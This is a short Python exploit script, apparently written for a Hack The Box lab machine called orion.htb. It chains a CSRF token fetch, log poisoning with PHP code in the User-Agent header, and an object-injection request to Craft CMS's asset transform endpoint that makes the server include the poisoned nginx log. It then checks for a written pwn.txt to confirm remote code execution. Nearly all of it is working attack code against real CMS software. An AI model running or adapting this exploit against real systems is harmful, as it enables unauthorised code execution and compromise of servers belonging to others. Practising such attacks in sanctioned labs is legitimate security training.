#!/usr/bin/env python3
import requests, socket, urllib3, re, time
urllib3.disable_warnings()

_orig = socket.getaddrinfo
def p(h, *a, **kw):
    return _orig("10.129.244.146" if h == "orion.htb" else h, *a, **kw)
socket.getaddrinfo = p

s = requests.Session()
s.verify = False

# Get CSRF
r = s.get("http://orion.htb/actions/users/session-info", headers={"Accept": "application/json"})
csrf = r.json()["csrfTokenValue"]
print(f"[+] CSRF: {csrf[:20]}")

# Step 1: Write file to web root via PHP injection
php_write = "<?php file_put_contents('pwn.txt','RCE_OK_'.date('Y-m-d H:i:s'));?>"
print(f"[+] Write PHP (len={len(php_write)}): poisoning UA")

r = s.get("http://orion.htb/", headers={"User-Agent": php_write})
print(f"[+] Poison response: {r.status_code}")
time.sleep(0.5)

# Step 2: Trigger to execute
data = [
    ("CRAFT_CSRF_TOKEN", csrf),
    ("assetId", "2"),
    ("handle[width]", "1"),
    ("handle[height]", "1"),
    ("handle[as x][class]", "yii\\rbac\\PhpManager"),
    ("handle[as x][itemFile]", "/var/log/nginx/access.log"),
]
r = s.post("http://orion.htb/actions/assets/generate-transform", data=data)
print(f"[+] Trigger: {r.status_code}")

# Step 3: Check if pwn.txt was created
time.sleep(0.5)
r = s.get("http://orion.htb/pwn.txt")
print(f"[+] pwn.txt GET: {r.status_code}")
print(r.text[:200])
